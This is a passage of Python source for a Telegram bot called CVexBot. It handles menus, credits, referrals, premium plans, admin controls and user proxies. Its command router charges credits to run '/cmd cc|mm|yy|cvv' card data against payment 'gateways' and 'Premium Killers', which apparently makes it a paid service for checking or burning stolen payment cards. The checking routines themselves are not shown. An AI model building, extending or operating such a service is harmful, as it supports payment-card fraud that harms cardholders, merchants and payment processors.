         {"text":"Edit Gateway","callback_data":"admin_editgw","style":"primary","icon_custom_emoji_id":BTN_GATEWAY}],
        [{"text":"Gen Keys","callback_data":"admin_genkey","style":"primary","icon_custom_emoji_id":BTN_KILLER},
         {"text":"Add Credits","callback_data":"admin_addcr","style":"success","icon_custom_emoji_id":BTN_ME}],
        [{"text":"Add Premium","callback_data":"admin_addprem","style":"success","icon_custom_emoji_id":BTN_REF},
         {"text":"Gen Plan","callback_data":"admin_genplan","style":"success","icon_custom_emoji_id":BTN_GENPLAN}],
        [{"text":"Gateway Settings","callback_data":"admin_gw_list","style":"primary","icon_custom_emoji_id":BTN_TOOLS},
         {"text":"Withdrawals","callback_data":"admin_withdrawals","style":"danger","icon_custom_emoji_id":BTN_WITHDRAW}],
        [{"text":"Broadcast","callback_data":"admin_broadcast","style":"danger","icon_custom_emoji_id":BTN_ADMIN},
         {"text":"Stats","callback_data":"admin_stats","style":"success","icon_custom_emoji_id":BTN_STATS}],
        [{"text":"« Back","callback_data":"menu_main","style":"primary","icon_custom_emoji_id":BTN_BACK}]
    ]})

def get_gw_list_markup():
    kb = []
    for g in get_gateways():
        cmd, name, _, _, status, gw_type, _ = g
        em = "5318760565902947324" if status == "ACTIVE" else ("5316826301611390284" if status == "OFF" else "5278444373615337666")
        kb.append([{"text":f"{name} [{status}] ({gw_type})","callback_data":f"admin_gw_set_{cmd}","style":"primary","icon_custom_emoji_id":em}])
    kb.append([{"text":"« Back","callback_data":"menu_admin","style":"danger","icon_custom_emoji_id":BTN_BACK}])
    return json.dumps({"inline_keyboard":kb})

def get_tools_markup():
    return json.dumps({"inline_keyboard":[
        [{"text":"List Proxies","callback_data":"tool_listpx","style":"primary","icon_custom_emoji_id":BTN_GATEWAY},
         {"text":"Recheck","callback_data":"tool_recheck","style":"danger","icon_custom_emoji_id":BTN_ADMIN}],
        [{"text":"« Back","callback_data":"menu_main","style":"primary","icon_custom_emoji_id":BTN_BACK}]
    ]})

# ==========================================
# START / CMDS
# ==========================================
@bot.message_handler(commands=['start'])
@crash_guard("start")
def cmd_start(message):
    uid = message.from_user.id; uname = message.from_user.username or ""
    user_states.pop(uid, None)
    if is_banned(uid): return safe_reply(message, f"{E_CROSS} You are banned.", parse_mode='HTML')

    args = message.text.split()
    ref_by = 0; plan_code = None
    if len(args) > 1:
        if args[1].startswith("ref_"):
            code = args[1].replace("ref_", "")
            c = get_db().cursor(); c.execute("SELECT id FROM users WHERE refer_code=?", (code,))
            row = c.fetchone()
            if row and row[0] != uid: ref_by = row[0]
        elif args[1].startswith("plan_"):
            plan_code = args[1].replace("plan_", "")

    if not is_joined(uid):
        mk = types.InlineKeyboardMarkup()
        mk.add(types.InlineKeyboardButton("📢 Join", url=FORCE_JOIN_LINK))
        mk.add(types.InlineKeyboardButton("✅ Verify", callback_data="verify_join"))
        return safe_reply(message, f"<b>{E_LAPTOP} #.CVexBot</b>\n{E_LINE}\n{E_EXCLAMATION} Join {FORCE_JOIN_CHANNEL}\n{E_LINE}", parse_mode='HTML', reply_markup=mk)

    user = get_user(uid)
    if not user:
        create_user(uid, uname, ref_by); user = get_user(uid)
    elif ref_by > 0 and user[8] == 0:
        create_user(uid, uname, ref_by); user = get_user(uid)

    # Plan redemption
    if plan_code:
        c = get_db().cursor()
        c.execute("SELECT * FROM plan_codes WHERE code=? AND used_by=0", (plan_code,))
        pc = c.fetchone()
        if pc:
            plan_name, credits_add, price, days = pc[1], pc[2], pc[3], pc[4]
            exp = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
            update_credits(uid, credits_add)
            update_status(uid, 'is_premium', 1)
            update_status(uid, 'expiry_date', exp)
            c.execute("UPDATE plan_codes SET used_by=?, used_at=? WHERE code=?",
                      (uid, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), plan_code))
            get_db().commit()
            safe_send(uid,
                f"{E_CHECK} <b>Plan Activated!</b>\n{E_LINE}\n"
                f"╰┈➤ {E_STAR} Plan : <b>{plan_name}</b>\n"
                f"╰┈➤ {E_HEART} Credits : <b>+{credits_add}</b>\n"
                f"╰┈➤ {E_CROWN} Premium : <b>Active</b>\n"
                f"╰┈➤ {E_FLASH} Expires : <b>{exp}</b>\n"
                f"{E_LINE}\n{E_ARROW} Use /cmds to start!", parse_mode='HTML')
        else:
            safe_send(uid, f"{E_CROSS} Invalid or used plan code.", parse_mode='HTML')

    if user and user[12] == 0:
        n1, n2 = random.randint(10, 99), random.randint(10, 99)
        user_states[uid] = {'state':'captcha','ans':n1+n2,'time':time.time(),'attempts':0}
        return safe_reply(message, f"<b>{E_TECH} Security Check</b>\n{E_LINE}\n{E_FLASH} What is <b>{n1} + {n2}</b>?\n{E_ARROW} Reply with number.\n{E_LINE}", parse_mode='HTML')

    send_welcome(message.chat.id, message.from_user.first_name)

@bot.message_handler(commands=['cmds'])
@crash_guard("cmds")
def cmd_cmds(message):
    uid = message.from_user.id
    if is_banned(uid): return
    ensure_user(uid, message.from_user.username or "")
    safe_send(message.chat.id, f"<b>{E_STAR} Main Menu</b>\n{E_ARROW} Select option:", parse_mode='HTML', reply_markup=get_main_markup(uid))

# ==========================================
# CALLBACKS
# ==========================================
@bot.callback_query_handler(func=lambda c: True)
@crash_guard("callback")
def handle_cb(call):
    uid = call.from_user.id; data = call.data
    if data != "verify_join":
        user = ensure_user(uid, call.from_user.username or "")
        if not user:
            return safe_answer(call.id, "❌ Please /start first.", show_alert=True)
    is_adm = is_admin(uid)

    if data == "verify_join":
        safe_answer(call.id, "⏳...")
        if is_joined(uid):
            try: bot.delete_message(call.message.chat.id, call.message.message_id)
            except: pass
            if not get_user(uid): create_user(uid, call.from_user.username or "")
            send_welcome(call.message.chat.id, call.from_user.first_name)
        else: safe_answer(call.id, "❌ Not joined!", show_alert=True)

    elif data == "menu_main":
        safe_edit(call.message.chat.id, call.message.message_id, f"<b>{E_STAR} Main Menu</b>\n{E_ARROW} Select option:", parse_mode='HTML', reply_markup=get_main_markup(uid))
    elif data == "menu_plans":
        safe_edit(call.message.chat.id, call.message.message_id, get_plans_text(), parse_mode='HTML', reply_markup=get_back_markup())
    elif data == "menu_me":
        u = get_user(uid)
        if not u: return safe_answer(call.id, "❌ Please /start first.", show_alert=True)
        prem = f"{E_CHECK} Active ({u[5]})" if has_premium(uid) else f"{E_CROSS} Free"
        txt = f"<b>{E_TECH} Profile</b>\n{E_LINE}\n╰┈➤ 🆔 ID: <code>{uid}</code>\n╰┈➤ {E_HEART} Credits: <b>{u[2]}</b>\n╰┈➤ {E_CROWN} Premium: <b>{prem}</b>\n╰┈➤ 👥 Refs: <b>{u[10]}/5</b>\n{E_LINE}"
        safe_edit(call.message.chat.id, call.message.message_id, txt, parse_mode='HTML', reply_markup=get_back_markup())
    elif data == "menu_refer":
        u = get_user(uid)
        if not u: return safe_answer(call.id, "❌ Please /start first.", show_alert=True)
        if not u[7]:
            new_code = secrets.token_urlsafe(8)
            c = get_db().cursor()
            c.execute("UPDATE users SET refer_code=? WHERE id=?", (new_code, uid))
            get_db().commit(); invalidate_cache(uid)
            u = get_user(uid)
        try: bot_username = bot.get_me().username
        except: bot_username = "CvexChkBot"
        link = f"https://t.me/{bot_username}?start=ref_{u[7]}"
        txt = f"<b>{E_HEART} Refer & Earn</b>\n{E_LINE}\nInvite friends to earn credits!\n╰┈➤ Link: <code>{link}</code>\n╰┈➤ Total: <b>{u[10]}/5</b>\n\n<i>Withdraw 5 credits when 5+ refs</i>\n{E_LINE}"
        kb = json.dumps({"inline_keyboard":[[{"text":"Withdraw 5 Credits","callback_data":"ref_withdraw","style":"success","icon_custom_emoji_id":BTN_WITHDRAW}],[{"text":"« Back","callback_data":"menu_main","style":"primary","icon_custom_emoji_id":BTN_BACK}]]})
        safe_edit(call.message.chat.id, call.message.message_id, txt, parse_mode='HTML', reply_markup=kb)
    elif data == "menu_tools":
        txt = f"<b>{E_TOOLS} Tools</b>\n{E_LINE}\n{E_FLASH} <code>.addpx ip:port:user:pass</code>\n{E_CHECK} <code>.listpx</code>\n{E_CROSS} <code>.rmpx num</code>\n{E_LINE}"
        safe_edit(call.message.chat.id, call.message.message_id, txt, parse_mode='HTML', reply_markup=get_tools_markup())
    elif data == "menu_killer":
        # 🔥 Visible for ALL — but locked for non-premium
        user_has_prem = has_premium(uid)
        gws = get_gateways("PREMIUM")
        txt = f"<b>{E_CROWN} Premium Killers</b>\n» Total: {len(gws)}\n"
        if not user_has_prem:
            txt += f"<i>🔒 Premium required to use</i>\n"
        for g in gws:
            cmd, name, price, cost, status, _, fmt = g
            em = E_CHECK if status == "ACTIVE" else E_WARN
            st = "Active" if status == "ACTIVE" else ("Off" if status == "OFF" else "Maint")
            lock = "" if user_has_prem else " 🔒"
            txt += f"{E_LINE}\n{E_STAR} <b>{name}{lock}</b>\n╰┈➤ St: {st} {em}\n╰┈➤ Format: <code>/{cmd} {fmt}</code>\n{E_ARROW} <b>Cost</b> » {cost} Credits\n"
        txt += E_LINE
        safe_edit(call.message.chat.id, call.message.message_id, txt, parse_mode='HTML', reply_markup=get_back_markup())
    elif data.startswith("menu_gw_"):
        page = int(data.split("_")[2]); gws = get_gateways("FREE")
        ipp = 4; tp = max(1, (len(gws)+ipp-1)//ipp)
        cur = gws[page*ipp:(page+1)*ipp]
        txt = f"<b>{E_LAPTOP} Free Gateways</b>\n» Page {page+1}/{tp} | ⚪ {len(gws)}\n"
        for g in cur:
            cmd, name, price, cost, status, _, fmt = g
            em = E_CHECK if status == "ACTIVE" else (E_CROSS if status == "OFF" else E_WARN)
            st = "Active" if status == "ACTIVE" else ("Off" if status == "OFF" else "Maint")
            txt += f"{E_LINE}\n{E_STAR} <b>{name} {price}</b>\n╰┈➤ St: {st} {em}\n╰┈➤ Format: <code>/{cmd} {fmt}</code>\n{E_ARROW} <b>Cost</b> » {cost} Credits\n"
        txt += E_LINE
        kb, nav = [], []
        if page > 0: nav.append({"text":"« Prev","callback_data":f"menu_gw_{page-1}","style":"primary"})
        if page < tp-1: nav.append({"text":"Next »","callback_data":f"menu_gw_{page+1}","style":"primary"})
        if nav: kb.append(nav)
        kb.append([{"text":"« Back","callback_data":"menu_main","style":"danger","icon_custom_emoji_id":BTN_BACK}])
        safe_edit(call.message.chat.id, call.message.message_id, txt, parse_mode='HTML', reply_markup=json.dumps({"inline_keyboard":kb}))
    elif data == "ref_withdraw":
        u = get_user(uid)
        if not u: return safe_answer(call.id, "❌ Please /start first.", show_alert=True)
        if u[10] < 5: return safe_answer(call.id, "❌ Need 5 refs.", show_alert=True)
        c = get_db().cursor()
        c.execute("INSERT INTO withdrawals (user_id, amount) VALUES (?, ?)", (uid, 5))
        wid = c.lastrowid
        c.execute("UPDATE users SET ref_credits = ref_credits - 5 WHERE id=?", (uid,))
        get_db().commit(); invalidate_cache(uid)
        try:
            kb = {"inline_keyboard":[[
                {"text":"✅ Approve","callback_data":f"w_app_{wid}","style":"success","icon_custom_emoji_id":"5318760565902947324"},
                {"text":"❌ Decline","callback_data":f"w_dec_{wid}","style":"danger","icon_custom_emoji_id":"5316826301611390284"}
            ]]}
            safe_send(OWNER_ID, f"💸 <b>WITHDRAWAL REQUEST</b>\n{E_LINE}\n👤 @{u[1] or uid}\n🆔 <code>{uid}</code>\n💰 Amount: 5 Credits\n📊 Refs: {u[10]}\n{E_LINE}", parse_mode='HTML', reply_markup=json.dumps(kb))
        except: pass
        safe_answer(call.id, "✅ Sent to Admin!", show_alert=True)

    elif data == "menu_admin":
        if not is_adm: return
        safe_edit(call.message.chat.id, call.message.message_id, f"<b>{E_CROWN} Admin Panel</b>\n{E_LINE}", parse_mode='HTML', reply_markup=get_admin_markup())
    elif data == "admin_gw_list":
        if not is_adm: return
        safe_edit(call.message.chat.id, call.message.message_id, f"<b>{E_TOOLS} Gateway Settings</b>", parse_mode='HTML', reply_markup=get_gw_list_markup())
    elif data.startswith("admin_gw_set_"):
        if not is_adm: return
        cmd = data.replace("admin_gw_set_", ""); g = get_gateway(cmd)
        if not g: return
        kb = [
            [{"text":"Active","callback_data":f"admin_gw_upd_{cmd}_ACTIVE","style":"success","icon_custom_emoji_id":"5318760565902947324"},
             {"text":"Off","callback_data":f"admin_gw_upd_{cmd}_OFF","style":"danger","icon_custom_emoji_id":"5316826301611390284"}],
            [{"text":"Maintenance","callback_data":f"admin_gw_upd_{cmd}_MAINT","style":"primary","icon_custom_emoji_id":"5278444373615337666"}],
            [{"text":f"Toggle Type ({g[5]})","callback_data":f"admin_gw_type_{cmd}","style":"success","icon_custom_emoji_id":BTN_TOOLS}],
            [{"text":"« Back","callback_data":"admin_gw_list","style":"primary","icon_custom_emoji_id":BTN_BACK}]
        ]
        safe_edit(call.message.chat.id, call.message.message_id, f"<b>{E_TOOLS} {g[1]}</b>", parse_mode='HTML', reply_markup=json.dumps({"inline_keyboard":kb}))
    elif data.startswith("admin_gw_upd_"):
        if not is_adm: return
        parts = data.split("_"); cmd, new_st = parts[3], parts[4]
        c = get_db().cursor(); c.execute("UPDATE gateways SET status=? WHERE cmd=?", (new_st, cmd)); get_db().commit()
        safe_answer(call.id, f"✅ {new_st}")
        safe_edit(call.message.chat.id, call.message.message_id, f"<b>{E_TOOLS} Settings</b>", parse_mode='HTML', reply_markup=get_gw_list_markup())
    elif data.startswith("admin_gw_type_"):
        if not is_adm: return
        cmd = data.replace("admin_gw_type_", ""); g = get_gateway(cmd)
        nt = "PREMIUM" if g[5] == "FREE" else "FREE"
        c = get_db().cursor(); c.execute("UPDATE gateways SET type=? WHERE cmd=?", (nt, cmd)); get_db().commit()
        safe_answer(call.id, f"✅ Type: {nt}")
        safe_edit(call.message.chat.id, call.message.message_id, f"<b>{E_TOOLS} Settings</b>", parse_mode='HTML', reply_markup=get_gw_list_markup())
    elif data == "admin_withdrawals":
        if not is_adm: return
        c = get_db().cursor(); c.execute("SELECT * FROM withdrawals WHERE status='PENDING'"); rows = c.fetchall()
        if not rows: return safe_answer(call.id, "No pending.", show_alert=True)
        kb = []
        for w in rows:
            kb.append([{"text":f"✅ {w[2]}cr ID:{w[1]}","callback_data":f"w_app_{w[0]}","style":"success","icon_custom_emoji_id":"5318760565902947324"},
                       {"text":"❌ Decline","callback_data":f"w_dec_{w[0]}","style":"danger","icon_custom_emoji_id":"5316826301611390284"}])
        kb.append([{"text":"« Back","callback_data":"menu_admin","style":"primary","icon_custom_emoji_id":BTN_BACK}])
        safe_edit(call.message.chat.id, call.message.message_id, f"<b>{E_CROWN} Pending</b>", parse_mode='HTML', reply_markup=json.dumps({"inline_keyboard":kb}))
    elif data.startswith("w_app_"):
        if not is_adm: return
        wid = int(data.split("_")[2])
        c = get_db().cursor(); c.execute("SELECT user_id, amount FROM withdrawals WHERE id=?", (wid,)); row = c.fetchone()
        if not row: return safe_answer(call.id, "❌ Not found", show_alert=True)
        c.execute("UPDATE withdrawals SET status='APPROVED' WHERE id=?", (wid,))
        c.execute("UPDATE users SET credits = credits + ? WHERE id=?", (row[1], row[0]))
        get_db().commit(); invalidate_cache(row[0])
        safe_answer(call.id, "✅ Approved")
        send_withdraw_approved(row[0], row[1])
        safe_edit(call.message.chat.id, call.message.message_id, f"✅ Approved {row[1]}cr to <code>{row[0]}</code>", parse_mode='HTML')
    elif data.startswith("w_dec_"):
        if not is_adm: return
        wid = int(data.split("_")[2])
        user_states[uid] = {'state':'admin_dec_reason','w_id':wid}
        safe_send(call.message.chat.id, "Enter reason:", parse_mode='HTML')
    elif data == "admin_stats":
        if not is_adm: return
        c = get_db().cursor(); c.execute("SELECT COUNT(*) FROM users"); tot = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM users WHERE is_premium=1"); pr = c.fetchone()[0]
        safe_answer(call.id, f"👥 Users: {tot}\n💎 Premium: {pr}", show_alert=True)

    elif data == "admin_addplan":
        if not is_adm: return
        user_states[uid] = {'state':'admin_addplan_name'}
        safe_send(call.message.chat.id, f"{E_STAR} Enter Plan Name:", parse_mode='HTML')
    elif data == "admin_editgw":
        if not is_adm: return
        user_states[uid] = {'state':'admin_editgw_cmd'}
        safe_send(call.message.chat.id, f"{E_STAR} Enter Gateway cmd (bl, k1):", parse_mode='HTML')
    elif data == "admin_broadcast":
        if not is_adm: return
        user_states[uid] = {'state':'admin_broadcast'}
        safe_send(call.message.chat.id, f"{E_STAR} Send anything to broadcast:", parse_mode='HTML')
    elif data == "admin_genkey":
        if not is_adm: return
        user_states[uid] = {'state':'admin_genkey_days'}
        safe_send(call.message.chat.id, f"{E_STAR} Enter Days:", parse_mode='HTML')
    elif data == "admin_addcr":
        if not is_adm: return
        user_states[uid] = {'state':'admin_addcr_target'}
        safe_send(call.message.chat.id, f"{E_STAR} Enter User ID / @username:", parse_mode='HTML')
    elif data == "admin_addprem":
        if not is_adm: return
        user_states[uid] = {'state':'admin_addprem_target'}
        safe_send(call.message.chat.id, f"{E_STAR} Enter User ID / @username:", parse_mode='HTML')
    elif data == "admin_genplan":
        if not is_adm: return
        txt = (f"{E_GIFT} <b>Generate Plan Code</b>\n{E_LINE}\n"
               f"<b>Usage:</b>\n"
               f"<code>/genplan &lt;plan_name&gt;</code>\n"
               f"<i>Uses plan defaults from /plans</i>\n\n"
               f"<code>/genplan &lt;name&gt; &lt;credits&gt; &lt;price&gt; &lt;days&gt;</code>\n"
               f"<i>Custom values (for GODMODE)</i>\n\n"
               f"<b>Examples:</b>\n"
               f"<code>/genplan SHADOW</code>\n"
               f"<code>/genplan GodMode 5000 100 30</code>")
        safe_send(call.message.chat.id, txt, parse_mode='HTML', reply_markup=get_admin_markup())

    elif data == "tool_listpx":
        u = get_user(uid); px = [x for x in u[6].split('\n') if x.strip()] if u and u[6] else []
        if not px: return safe_answer(call.id, "❌ No proxies.", show_alert=True)
        txt = f"{E_TOOLS} <b>Your Proxies ({len(px)}):</b>\n\n"
        for i, p in enumerate(px): txt += f"<code>{i+1}. {p}</code>\n"
        txt += f"\n{E_ARROW} Use <code>.rmpx num</code>"
        safe_edit(call.message.chat.id, call.message.message_id, txt, parse_mode='HTML', reply_markup=get_tools_markup())
    elif data == "tool_recheck":
        u = get_user(uid); px = [x for x in u[6].split('\n') if x.strip()] if u and u[6] else []
        if not px: return safe_answer(call.id, "❌ No proxies.", show_alert=True)
        safe_answer(call.id, "⏳ Rechecking...")
        msg = safe_send(call.message.chat.id, f"{E_FLASH} Checking {len(px)}...", parse_mode='HTML')
        def do_recheck():
            alive = []; dead = 0; txt = ""
            for p in px:
                if check_proxy(p):
                    alive.append(p)
                    info = get_proxy_info(p)
                    txt += (f"{E_CHECK} <code>{info['ip']}</code> | {info['country']}\n" if info else f"{E_CHECK} <code>{p}</code>\n")
                else: dead += 1
            update_status(uid, 'proxies', "\n".join(alive))
            if msg: safe_edit(msg.chat.id, msg.message_id, f"{E_TOOLS} <b>Recheck!</b>\nAlive: {len(alive)} | Dead: {dead}\n\n{txt}", parse_mode='HTML', reply_markup=get_tools_markup())
        threading.Thread(target=do_recheck).start()

# ==========================================
# COMMANDS
# ==========================================
@bot.message_handler(func=lambda m: m.text and m.text[0] in ('.', '/', '$'))
@crash_guard("cmd")
def handle_cmd(message):
    uid = message.from_user.id
    user_states.pop(uid, None)
    if is_banned(uid): return

    user = ensure_user(uid, message.from_user.username or "")
    if not user:
        return safe_reply(message, f"{E_CROSS} Error. /start", parse_mode='HTML')
    if user[12] == 0:
        return safe_reply(message, f"{E_CROSS} <b>Not Verified!</b>\n{E_ARROW} /start first", parse_mode='HTML')

    if is_spam(uid, has_premium(uid), is_admin(uid)):
        return safe_reply(message, f"{E_EXCLAMATION} Rate limited.", parse_mode='HTML')

    parts = message.text[1:].strip().split(' ', 1)
    cmd = parts[0].lower(); args = parts[1] if len(parts) > 1 else ""

    if cmd == 'cmds': return cmd_cmds(message)
    if cmd == 'plans': return safe_send(message.chat.id, get_plans_text(), parse_mode='HTML')
    if cmd == 'me':
        prem = f"{E_CHECK} Active ({user[5]})" if has_premium(uid) else f"{E_CROSS} Free"
        return safe_reply(message, f"<b>{E_TECH} Profile</b>\n{E_LINE}\n╰┈➤ 🆔 ID: <code>{uid}</code>\n╰┈➤ {E_HEART} Credits: <b>{user[2]}</b>\n╰┈➤ {E_CROWN} Premium: <b>{prem}</b>\n╰┈➤ 👥 Refs: <b>{user[10]}/5</b>\n{E_LINE}", parse_mode='HTML')

    if cmd == 'addpx':
        if not args: return
        p = args.strip()
        if "://" not in p:
            prts = p.split(":")
            if len(prts) == 4: p = f"http://{prts[2]}:{prts[3]}@{prts[0]}:{prts[1]}"
            else: p = "http://" + p
        existing = [x for x in user[6].split('\n') if x.strip()] if user[6] else []
        if p in existing:
            return safe_reply(message, f"{E_WARN} <b>Already added!</b>\n<code>{p}</code>", parse_mode='HTML')
        msg = safe_reply(message, f"{E_FLASH} Checking...", parse_mode='HTML')
        def add():
            if check_proxy(p):
                info = get_proxy_info(p)
                u2 = get_user(uid); ex = [x for x in u2[6].split('\n') if x.strip()] if u2 and u2[6] else []
                if p not in ex: ex.append(p); update_status(uid, 'proxies', "\n".join(ex))
                txt = f"{E_CHECK} <b>Added!</b>\n\nIP: <code>{info['ip'] if info else p}</code>\n{(info['country'] if info else '')}\n\nTotal: {len(ex)}"
                if msg: safe_edit(msg.chat.id, msg.message_id, txt, parse_mode='HTML')
                return
            if msg: safe_edit(msg.chat.id, msg.message_id, f"{E_CROSS} DEAD proxy.", parse_mode='HTML')
        threading.Thread(target=add).start()
        return
    if cmd == 'listpx':
        px = [x for x in user[6].split('\n') if x.strip()] if user[6] else []
        if not px: return safe_reply(message, f"{E_EXCLAMATION} No proxies.", parse_mode='HTML')
        txt = f"{E_TOOLS} <b>Proxies ({len(px)}):</b>\n\n"
        for i, p in enumerate(px): txt += f"<code>{i+1}. {p}</code>\n"
        return safe_reply(message, txt, parse_mode='HTML')
    if cmd == 'rmpx':
        try:
            idx = int(args) - 1
            px = [x for x in user[6].split('\n') if x.strip()] if user[6] else []
            if 0 <= idx < len(px):
                px.pop(idx); update_status(uid, 'proxies', "\n".join(px))
                safe_reply(message, f"{E_CHECK} Removed.")
        except: pass
        return

    if cmd == 'genplan' and is_admin(uid):
        parts_args = args.split()
        if len(parts_args) < 1:
            return safe_reply(message, "Usage:\n<code>/genplan &lt;name&gt;</code>\n<code>/genplan &lt;name&gt; &lt;credits&gt; &lt;price&gt; &lt;days&gt;</code>", parse_mode='HTML')
        plan_name = parts_args[0]
        if len(parts_args) >= 4:
            try:
                credits = int(parts_args[1]); price = parts_args[2]; days = int(parts_args[3])
            except:
                return safe_reply(message, f"{E_CROSS} Invalid values.", parse_mode='HTML')
        else:
            c = get_db().cursor()
            c.execute("SELECT credits, price, days FROM plans WHERE UPPER(name)=UPPER(?)", (plan_name,))
            row = c.fetchone()
            if not row:
                return safe_reply(message, f"{E_CROSS} Plan '{plan_name}' not found. Provide custom: <code>/genplan {plan_name} &lt;credits&gt; &lt;price&gt; &lt;days&gt;</code>", parse_mode='HTML')
            credits, price, days = row
        code = secrets.token_urlsafe(16)
        c = get_db().cursor()
        c.execute("INSERT INTO plan_codes (code, plan_name, credits, price, days, created_by, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)",
                  (code, plan_name, credits, price, days, uid, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        get_db().commit()
        try: bot_username = bot.get_me().username
        except: bot_username = "CvexChkBot"
        link = f"https://t.me/{bot_username}?start=plan_{code}"
        safe_reply(message,
            f"{E_CHECK} <b>Plan Code Generated!</b>\n{E_LINE}\n"
            f"╰┈➤ {E_STAR} Plan : <b>{plan_name}</b>\n"
            f"╰┈➤ {E_HEART} Credits : <b>{credits}</b>\n"
            f"╰┈➤ {E_CROWN} Price : <b>${price}</b>\n"
            f"╰┈➤ {E_FLASH} Days : <b>{days}</b>\n"
            f"{E_LINE}\n{E_ARROW} <b>Link:</b>\n<code>{link}</code>\n\n"
            f"<i>Send to user → subscription activates on click</i>",
            parse_mode='HTML')
        return

    if cmd == 'ban' and is_admin(uid):
        try:
            t = int(args) if args.isdigit() else get_user_by_username(args)[0]
            update_status(t, 'banned', 1); safe_reply(message, f"{E_CHECK} Banned.")
        except: pass
        return
    if cmd == 'lookup' and is_admin(uid):
        try:
            t = int(args) if args.isdigit() else get_user_by_username(args)[0]
            u = get_user(t)
            if u: safe_reply(message, f"ID:{u[0]}\nUser:@{u[1]}\nCredits:{u[2]}\nRefs:{u[10]}\nPremium:{u[3]}", parse_mode='HTML')
        except: pass
        return
    if cmd == 'addcred' and is_admin(uid):
        parts_args = args.split()
        if len(parts_args) != 2: return safe_reply(message, "Usage: <code>/addcred @user 100</code>", parse_mode='HTML')
        target_u = resolve_user_target(parts_args[0])
        if not target_u: return safe_reply(message, f"{E_CROSS} User not found.", parse_mode='HTML')
        try: amt = int(parts_args[1])
        except: return safe_reply(message, f"{E_CROSS} Invalid amount.", parse_mode='HTML')
        update_credits(target_u[0], amt)
        safe_reply(message, f"{E_CHECK} Added <b>{amt:+d}</b> to <code>{target_u[0]}</code>\nNew: <b>{target_u[2] + amt}</b>", parse_mode='HTML')
        send_credit_notification(target_u[0], amt)
        return
    if cmd == 'addprem' and is_admin(uid):
        parts_args = args.split()
        if len(parts_args) != 2: return safe_reply(message, "Usage: <code>/addprem @user 30</code>", parse_mode='HTML')
        target_u = resolve_user_target(parts_args[0])
        if not target_u: return safe_reply(message, f"{E_CROSS} User not found.", parse_mode='HTML')
        try:
            d = int(parts_args[1])
            if d <= 0 or d > 3650: raise ValueError
        except: return safe_reply(message, f"{E_CROSS} Invalid days.", parse_mode='HTML')
        exp = (datetime.now() + timedelta(days=d)).strftime("%Y-%m-%d %H:%M:%S")
        update_status(target_u[0], 'is_premium', 1); update_status(target_u[0], 'expiry_date', exp)
        safe_reply(message, f"{E_CHECK} Premium {d}d to <code>{target_u[0]}</code>", parse_mode='HTML')
        send_premium_notification(target_u[0], d, exp)
        return
    if cmd == 'setsticker' and is_admin(uid):
        if not args.strip(): return safe_reply(message, "Usage: <code>.setsticker &lt;file_id or URL&gt;</code>", parse_mode='HTML')
        c = get_db().cursor()
        c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES ('sticker_id', ?)", (args.strip(),))
        get_db().commit()
        safe_reply(message, f"{E_CHECK} Sticker set!", parse_mode='HTML')
        return

    g = get_gateway(cmd)
    if not g: return
    _, name, price, cost, status, gw_type, fmt = g
    if status == "OFF": return safe_reply(message, f"{E_CROSS} OFF.", parse_mode='HTML')
    if status == "MAINT": return safe_reply(message, f"{E_WARN} Maint.", parse_mode='HTML')
    if gw_type == "PREMIUM" and not has_premium(uid):
        return safe_send(message.chat.id, get_premium_required_text(cmd), parse_mode='HTML')
    if user[2] < cost: return safe_reply(message, f"{E_CROSS} Need {cost} credits. You have {user[2]}.", parse_mode='HTML')
    if not args: return safe_reply(message, f"Usage: <code>/{cmd} cc|mm|yy|cvv</code>", parse_mode='HTML')

    update_credits(uid, -cost)
    if cmd == 'bl': threading.Thread(target=process_api, args=(message, args, 'bl')).start()
    elif cmd == 'fat': threading.Thread(target=process_api, args=(message, args, 'fat')).start()
    elif cmd == 'nmi': threading.Thread(target=process_api, args=(message, args, 'nmi')).start()
    else: threading.Thread(target=process_killer, args=(message, args, cmd)).start()

# ==========================================
# STATE
# ==========================================
@bot.message_handler(content_types=['text', 'photo', 'video', 'sticker', 'document'])
@crash_guard("state")
def handle_state(message):
    uid = message.from_user.id; st = user_states.get(uid, {}); state = st.get('state')

    if state == 'captcha':
        if time.time() - st.get('time', 0) > 180:
            del user_states[uid]; return safe_reply(message, f"{E_CROSS} Expired. /start", parse_mode='HTML')
        try: val = int((message.text or "").strip())
        except:
            st['attempts'] = st.get('attempts', 0) + 1
            if st['attempts'] >= 3:
                del user_states[uid]; return safe_reply(message, f"{E_CROSS} Too many. /start", parse_mode='HTML')
            return safe_reply(message, f"{E_CROSS} Enter a <b>number</b>. {st['attempts']}/3", parse_mode='HTML')
        if val == st['ans']:
            del user_states[uid]; update_status(uid, 'is_verified', 1)
            send_welcome(message.chat.id, message.from_user.first_name)
        else:
            st['attempts'] = st.get('attempts', 0) + 1
            if st['attempts'] >= 3:
                del user_states[uid]; return safe_reply(message, f"{E_CROSS} Too many. /start", parse_mode='HTML')
            safe_reply(message, f"{E_CROSS} Wrong. {st['attempts']}/3", parse_mode='HTML')

    elif state == 'admin_dec_reason' and is_admin(uid):
        wid = st['w_id']; reason = message.text
        c = get_db().cursor()
        c.execute("SELECT user_id, amount FROM withdrawals WHERE id=?", (wid,)); row = c.fetchone()
        if not row:
            del user_states[uid]; return safe_reply(message, f"{E_CROSS} Not found.", parse_mode='HTML')
        c.execute("UPDATE withdrawals SET status='DECLINED', reason=? WHERE id=?", (reason, wid))
        c.execute("UPDATE users SET ref_credits = ref_credits + ? WHERE id=?", (row[1], row[0]))
        get_db().commit(); invalidate_cache(row[0])
        del user_states[uid]
        safe_reply(message, f"{E_CHECK} Declined + refunded {row[1]} refs.", parse_mode='HTML')
        send_withdraw_declined(row[0], reason, row[1])

    elif state == 'admin_broadcast' and is_admin(uid):
        safe_reply(message, "📢 Broadcasting...")
        def br(msg_id, chat_id):
            c = get_db().cursor(); c.execute("SELECT id FROM users"); users = c.fetchall()
            def cp(u):
                try: bot.copy_message(u[0], chat_id, msg_id); return True
                except: return False
            with ThreadPoolExecutor(max_workers=20) as ex:
                res = list(ex.map(cp, users))
            safe_send(message.chat.id, f"{E_CHECK} Sent to {sum(res)} users.", parse_mode='HTML', reply_markup=get_admin_markup())
        threading.Thread(target=br, args=(message.message_id, message.chat.id)).start()
        del user_states[uid]

    elif state == 'admin_addplan_name':
        user_states[uid] = {'state':'admin_addplan_credits','name':message.text}
        safe_reply(message, "Enter Credits:")
